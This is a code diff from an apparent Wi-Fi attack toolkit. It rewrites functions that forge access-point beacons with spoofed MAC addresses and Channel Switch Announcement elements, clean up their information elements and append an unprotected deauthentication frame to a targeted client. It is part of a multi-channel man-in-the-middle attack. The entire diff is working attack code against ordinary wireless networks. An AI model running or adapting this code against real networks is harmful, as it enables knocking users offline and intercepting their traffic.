@@ -16,6 +16,7 @@
 #include "logger/report.h"
 #include "observer/observers.h"
 #include "observer/tshark_wrapper.h"
+#include "attacks/mc_mitm/wifi_util.h"
 #include "net_parser/channel_defs.h"
 #include "net_parser/dot11_defs.h"
 #include "net_parser/radiotap_defs.h"
@@ -28,98 +29,74 @@ using namespace filesystem;
 using namespace Tins;
 using namespace chrono;
 using namespace observer::tshark;
-static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) {
-	auto opts = src.options();
-	vector sorted_opts(opts.begin(), opts.end());
-	//TODO add this to pdf (why is filtered)
-	// patch HT_OPERATION primary channel + VHT_OPERATION center channel
-	for(auto &o: sorted_opts) {
-		const auto id = o.option();
-		if(id == static_cast<uint8_t>(Dot11::OptionTypes::DS_SET)) {
-			const uint8_t ch = ap_channel.ch_num;
-			o = Dot11::option(Dot11::OptionTypes::DS_SET, 1, &ch);
-		} else if(id == static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION)) {
-			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
-			if(!data.empty()) data[0] = static_cast<uint8_t>(ap_channel.ch_num);
-			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
-		} else if(id == Dot11::OptionTypes::VHT_OP) {
-			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
-			if(data.size() >= dot11::VHT_OP_MIN_SIZE && data[0] == dot11::VHT_OP_WIDTH_80MHZ)
-				data[dot11::VHT_OP_CENTER_CH0_OFF] = dot11::vht_center_ch(ap_channel.ch_num);
-			o = Dot11::option(Dot11::OptionTypes::VHT_OP, data.size(), data.data());
-		}
+static void patch_ies(frame_raw_t &raw, const Channel &ap_channel) {
+	patch_ds_param_in_frame(raw, ap_channel.ch_num);
+	patch_ht_operation_in_frame(raw, ap_channel.ch_num);
+	patch_vht_center_in_frame(raw, dot11::vht_center_ch(ap_channel.ch_num));
+	const size_t ie_start = radiotap::get_rt_len(raw) + dot11::MGMT_HDR_SIZE + dot11::BEACON_FIXED;
+	if(ie_start >= raw.size()) return;
+	struct IESpan { uint8_t tag, len; vector<uint8_t> data; };
+	vector<IESpan> ies;
+	for(size_t i = ie_start; i + 1 < raw.size();) {
+		const uint8_t tag = raw[i], len = raw[i + 1];
+		if(i + dot11::IE_HDR_SIZE + len > raw.size()) break;
+		ies.push_back({tag, len, {raw.begin() + i + dot11::IE_HDR_SIZE, raw.begin() + i + dot11::IE_HDR_SIZE + len}});
+		i += dot11::IE_HDR_SIZE + len;
 	}
-	erase_if(sorted_opts, [](const auto &o) {
-		const auto id = static_cast<uint8_t>(o.option());
+	// keep only whitelisted IEs
+	erase_if(ies, [](const IESpan &ie) {
 		static constexpr array kept_ids = {
-			dot11::IE_SSID,
-			dot11::IE_RATES,
-			dot11::IE_DS_PARAM_SET,
-			dot11::IE_TIM,
-			dot11::IE_COUNTRY,
-			dot11::IE_CSA,
-			dot11::IE_ECSA,
-			dot11::IE_ERP_INFO,
-			dot11::IE_HT_CAPS,
-			dot11::IE_HT_OPERATION,
-			dot11::IE_VHT_CAPS,
-			dot11::IE_VHT_OPERATION,
-			dot11::IE_RSN,
-			dot11::IE_EXT_RATES,
-			dot11::IE_SUPPORTED_OP_CLASSES,
-			dot11::IE_EXTENDED_CAPS,
-			dot11::IE_VENDOR_SPECIFIC,
+			dot11::IE_SSID, dot11::IE_RATES, dot11::IE_DS_PARAM_SET, dot11::IE_TIM,
+			dot11::IE_COUNTRY, dot11::IE_CSA, dot11::IE_ECSA, dot11::IE_ERP_INFO,
+			dot11::IE_HT_CAPS, dot11::IE_HT_OPERATION, dot11::IE_VHT_CAPS, dot11::IE_VHT_OPERATION,
+			dot11::IE_RSN, dot11::IE_EXT_RATES, dot11::IE_SUPPORTED_OP_CLASSES,
+			dot11::IE_EXTENDED_CAPS, dot11::IE_VENDOR_SPECIFIC,
 		};
-		if(ranges::find(kept_ids, static_cast<dot11::IE>(id)) == kept_ids.end()) return true; //erase
-		// filter out useless VENDOR_SPECIFIC IEs - keep only Microsoft OUI type 1 (WPA) and type 2 (WMM/WME)
-		if(id == static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC)) {
-			const auto *data = o.data_ptr();
-			if(o.data_size() < dot11::VENDOR_SPECIFIC_OUI_TYPE_MIN) return true;
-			if(!equal(dot11::MS_OUI.begin(), dot11::MS_OUI.end(), data)) return true;
-			const uint8_t type = data[dot11::VENDOR_SPECIFIC_TYPE_OFF];
+		if(ranges::find(kept_ids, static_cast<dot11::IE>(ie.tag)) == kept_ids.end()) return true;
+		// filter VENDOR_SPECIFIC to MS OUI type 1 (WPA) and type 2 (WMM/WME)
+		if(ie.tag == dot11::IE_VENDOR_SPECIFIC) {
+			if(ie.data.size() < dot11::VENDOR_SPECIFIC_OUI_TYPE_MIN) return true;
+			if(!equal(dot11::MS_OUI.begin(), dot11::MS_OUI.end(), ie.data.begin())) return true;
+			const uint8_t type = ie.data[dot11::VENDOR_SPECIFIC_TYPE_OFF];
 			return type != dot11::MS_OUI_TYPE_WPA && type != dot11::MS_OUI_TYPE_WMM;
 		}
 		return false;
 	});
-	ranges::sort(sorted_opts, [](const auto &a, const auto &b) {
-		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
-	});
-	Dot11Beacon result(src.addr1(), src.addr2());
-	result.addr3(src.addr3());
-	result.capabilities() = src.capabilities();
-	result.interval(src.interval());
-	result.timestamp(src.timestamp());
-	for(const auto &opt: sorted_opts) result.add_option(opt);
-	return result;
+	ranges::sort(ies, [](const auto &a, const auto &b) { return a.tag < b.tag; });
+	raw.erase(raw.begin() + static_cast<ptrdiff_t>(ie_start), raw.end());
+	for(const auto &ie : ies) {
+		raw.push_back(ie.tag);
+		raw.push_back(ie.len);
+		raw.insert(raw.end(), ie.data.begin(), ie.data.end());
+	}
 }
-RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, const Channel &new_channel,
-	const int switch_count, const Dot11Beacon *src_beacon) {
-	Dot11Beacon b = src_beacon ? *src_beacon : Dot11Beacon{};
-	Dot11ManagementFrame::channel_switch_type cs;
-	cs.switch_mode = 1;
-	cs.new_channel = new_channel.ch_num;
-	cs.switch_count = switch_count;
-	b.channel_switch(cs);
-	// ECSA IE (60): switch_mode, operating_class, new_channel, switch_count
-	// Required for 5 GHz - basic CSA IE has no operating class
-	const array<uint8_t, 4> ecsa{
-		1, dot11::get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)
+frame_raw_t get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, const Channel &new_channel,
+	const int switch_count, const frame_raw_t *src_raw) {
+	static const auto make_minimal = [] {
+		frame_raw_t b(dot11::MGMT_HDR_SIZE + dot11::BEACON_FIXED, 0);
+		b[dot11::FC_OFFSET] = static_cast<uint8_t>(dot11::MGMT_BEACON << dot11::FC_SUBTYPE_SHIFT);
+		return b;
 	};
-	b.add_option(Dot11::option(dot11::IE_ECSA, ecsa.size(), ecsa.data()));
-	b = patch_ies(b, ap_channel);
-	b.addr1(Dot11::BROADCAST);
-	b.addr2(ap_mac);
-	b.addr3(ap_mac);
-	RadioTap radiotap{};
-	radiotap.inner_pdu(b);
-	return radiotap;
+	frame_raw_t raw = ensure_radiotap(src_raw ? *src_raw : make_minimal());
+	const size_t hdr = radiotap::get_rt_len(raw);
+	fill_n(raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR1_OFFSET), dot11::MAC_ADDRESS_SIZE, uint8_t{0xFF});
+	ranges::copy(ap_mac, raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR2_OFFSET));
+	ranges::copy(ap_mac, raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR3_OFFSET));
+	// CSA IE: mode=1, new_channel, switch_count
+	dot11::push_ie(raw, dot11::IE_CSA,  array<uint8_t, 3>{1, new_channel.ch_num, static_cast<uint8_t>(switch_count)});
+	// ECSA IE: mode=1, operating_class, new_channel, switch_count (required for 5 GHz)
+	dot11::push_ie(raw, dot11::IE_ECSA, array<uint8_t, 4>{1, dot11::get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)});
+	patch_ies(raw, ap_channel);
+	return raw;
 }
 vector<frame_raw_t> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
 	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac,
 	const bool add_deauth) {
 	vector<frame_raw_t> frames;
+	const frame_raw_t src_raw = beacon ? beacon->serialize() : frame_raw_t{};
+	const frame_raw_t *src_ptr = beacon ? &src_raw : nullptr;
 	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
-		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()).serialize());
+		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, src_ptr));
 	// after switch_count=0: inject unprotected Deauth
 	if(add_deauth) frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac).serialize());
 	return frames;
@@ -130,8 +107,8 @@ void update_time_CSA_frames(vector<frame_raw_t> &frames) {
 		const uint16_t rt_len = radiotap::get_rt_len(raw);
 		if(rt_len >= raw.size()) continue;
 		const uint8_t fc0 = raw[rt_len];
-		if(((fc0 >> dot11::FC_TYPE_SHIFT)    & dot11::FC_TYPE_MASK)    != dot11::TYPE_MGMT)   continue;
-		if(((fc0 >> dot11::FC_SUBTYPE_SHIFT) & dot11::FC_SUBTYPE_MASK) != dot11::MGMT_BEACON) continue;
+		if((fc0 >> dot11::FC_TYPE_SHIFT    & dot11::FC_TYPE_MASK)    != dot11::TYPE_MGMT)   continue;
+		if((fc0 >> dot11::FC_SUBTYPE_SHIFT & dot11::FC_SUBTYPE_MASK) != dot11::MGMT_BEACON) continue;
 		const size_t ts_off = rt_len + dot11::MGMT_HDR_SIZE;
 		if(ts_off + sizeof(uint64_t) > raw.size()) continue;
 		for(size_t i = 0; i < sizeof(uint64_t); ++i)
